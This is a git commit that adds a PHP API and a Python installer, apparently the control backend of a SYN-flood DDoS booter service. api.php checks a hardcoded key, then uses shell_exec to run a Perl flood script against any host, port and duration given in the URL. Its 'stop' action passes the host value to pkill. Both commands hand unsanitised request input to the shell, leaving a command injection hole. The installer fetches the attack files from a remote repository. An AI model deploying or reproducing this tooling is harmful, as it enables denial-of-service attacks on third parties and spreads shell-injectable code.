77f62bfae738c5d2e5ea55080bf6eb4467b159d1
xIvan0ff <hrisivanov2@gmail.com>
2021-11-11 17:30:28 +0200

    First testing

---
+++ api.php
@@ -0,0 +1,79 @@
+<?php
+ignore_user_abort(true);
+set_time_limit(0);
+
+
+$key = $_GET['key'];
+$host = $_GET['host'];
+$port = intval($_GET['port']);
+$time = intval($_GET['time']);
+$method = $_GET['method'];
+$action = $_GET['action'];
+
+$array = array("syn", "stop");
+$ray = array("etherealhehe");
+
+
+if (!empty($key)) {
+} else {
+    die('Error: API key is empty!');
+}
+
+if (in_array($key, $ray)) {
+} else {
+    die('Error: Incorrect API key!');
+}
+
+
+if (!empty($time)) {
+} else {
+    die('Error: time is empty!');
+}
+
+
+if (!empty($host)) {
+} else {
+    die('Error: Host is empty!');
+}
+
+
+if (!empty($method)) {
+} else {
+    die('Error: Method is empty!');
+}
+
+
+if (in_array($method, $array)) {
+} else {
+    die('Error: The method you requested does not exist!');
+}
+
+
+if ($port > 44405) {
+    die('Error: Ports over 44405 do not exist');
+}
+
+if (ctype_digit($Time)) {
+    die('Error: Time is not in numeric form!');
+}
+
+if (ctype_digit($Port)) {
+    die('Error: Port is not in numeric form!');
+}
+
+
+
+
+
+if ($method == "syn") {
+    $command = "screen -dm perl syn.pl $host $port 55000 $time";
+}
+// if ($method == "tcp") {
+//     $command = "screen -dm /root/tcp $host 8 300000 $time";
+// }
+if ($method == "stop") {
+    $command = "pkill $host -f";
+}
+
+
+shell_exec($command);
---
+++ installer.py
@@ -0,0 +1,11 @@
+import requests
+import os
+files = ['syn.pl', 'api.php']
+
+for file in files:
+    url = 'https://raw.githubusercontent.com/xIvan0ff/ethereal-installer/main/' + file
+    r = requests.get(url)
+    open(file, 'wb').write(r.content)
+
+cwd = os.getcwd()
+print cwd + "/api.php key: etherealhehe"
